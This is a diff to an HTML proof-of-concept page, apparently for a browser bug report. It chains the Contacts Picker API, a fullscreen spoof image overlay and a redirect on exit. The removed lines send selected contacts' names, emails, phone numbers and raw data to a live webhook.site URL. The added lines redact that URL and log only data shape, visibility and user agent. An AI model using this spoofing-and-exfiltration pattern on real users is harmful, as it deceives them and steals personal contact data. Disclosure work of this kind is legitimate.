@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Contacts Picker Fullscreen PoC</title>
+  <title>Contacts Picker → Fullscreen UI Spoof PoC</title>
   <meta charset="utf-8">
   <meta name="viewport"
         content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
@@ -13,7 +13,7 @@
       width: 100%;
       height: 100%;
       background: #000;
-      font-family: sans-serif;
+      font-family: system-ui, sans-serif;
     }
 
     #spoof {
@@ -39,97 +39,91 @@
 
 <body>
 
-<img id="spoof" src="spof2.png" style="display:none">
+<img id="spoof" src="spof2.png" alt="spoof-ui">
 
 <div id="content">
-  <h1>Click anywhere to start demo</h1>
+  <h1>Tap anywhere to start demo</h1>
 </div>
 
 <script>
-const WEBHOOK = "https://webhook.site/8c1d3f26-5912-43a1-b878-91e9d07b3274";
+/**
+ * NOTE:
+ * - Contact data is intentionally redacted
+ * - This PoC demonstrates event sequencing + UI state confusion
+ */
+
+const WEBHOOK = "https://webhook.site/XXXXXXXX-REDACTED";
 
 function send(event, extra = {}) {
   fetch(WEBHOOK, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      time: new Date().toISOString(),
+      timestamp: new Date().toISOString(),
       event,
+      visibility: document.visibilityState,
+      fullscreen: !!document.fullscreenElement,
+      userAgent: navigator.userAgent,
       ...extra
     })
   }).catch(() => {});
 }
 
+// Track visibility changes
+document.addEventListener("visibilitychange", () => {
+  send("visibility_change");
+});
+
 document.addEventListener("click", async () => {
 
-  // 1️⃣ Log picker intent
+  // 1️⃣ User gesture → Contacts Picker
   send("contacts_picker_called", {
-    fields_requested: ["name", "tel", "email"]
+    requested_fields: ["name", "tel", "email"]
   });
 
   let granted = false;
-  let contactData = null;
 
-  // 2️⃣ Trusted system UI
   if (navigator.contacts && navigator.contacts.select) {
     try {
       const result = await navigator.contacts.select(
         ["name", "tel", "email"],
         { multiple: false }
       );
-      
-      if (result && result.length > 0) {
+
+      if (result && result.length) {
         granted = true;
-        contactData = result[0];
-        
-        // Send contact details to webhook
+
+        // ⚠️ REDACTED ON PURPOSE
         send("contact_selected", {
           granted: true,
-          contact_name: contactData.name ? contactData.name.join(", ") : "No name",
-          contact_email: contactData.email ? contactData.email.join(", ") : "No email", 
-          contact_phone: contactData.tel ? contactData.tel.join(", ") : "No phone",
-          raw_data: contactData
+          contact_payload_shape: {
+            hasName: !!result[0].name,
+            hasEmail: !!result[0].email,
+            hasTel: !!result[0].tel
+          }
         });
       }
     } catch (e) {
       send("contacts_picker_error", {
-        granted: false,
-        error: e.name,
-        message: e.message
+        error: e.name
       });
     }
   } else {
-    // Fallback - simulate contact selection
-    const mockContact = {
-      name: ["John Doe"],
-      email: ["john.doe@gmail.com"],
-      tel: ["+6281234567890"]
-    };
-    
+    // API unsupported fallback
     granted = true;
-    contactData = mockContact;
-    
     send("contact_selected_mock", {
       granted: true,
-      contact_name: "John Doe",
-      contact_email: "john.doe@gmail.com",
-      contact_phone: "+6281234567890",
-      note: "Mock data - API not supported"
+      note: "Contacts API not supported"
     });
   }
 
-  if (granted) {
-    send("contacts_picker_completed", {
-      granted: true,
-      note: "Contact data captured successfully"
-    });
-  }
+  send("contacts_picker_closed", { granted });
 
-  // 3️⃣ Show spoof overlay
+  // 2️⃣ Replace page UI
   document.getElementById("spoof").style.display = "block";
   document.getElementById("content").style.display = "none";
 
-  // 4️⃣ Enter fullscreen
+  // 3️⃣ Enter fullscreen after picker
   if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen()
       .then(() => send("entered_fullscreen"))
@@ -138,13 +132,14 @@ document.addEventListener("click", async () => {
 
 }, { once: true });
 
-// 5️⃣ Exit fullscreen → redirect
+// 4️⃣ Detect fullscreen exit
 document.addEventListener("fullscreenchange", () => {
   if (!document.fullscreenElement) {
-    send("exit_fullscreen_redirect");
+    send("exited_fullscreen");
+
     setTimeout(() => {
       location.href = "https://google.com";
-    }, 50);
+    }, 100);
   }
 });
 </script>
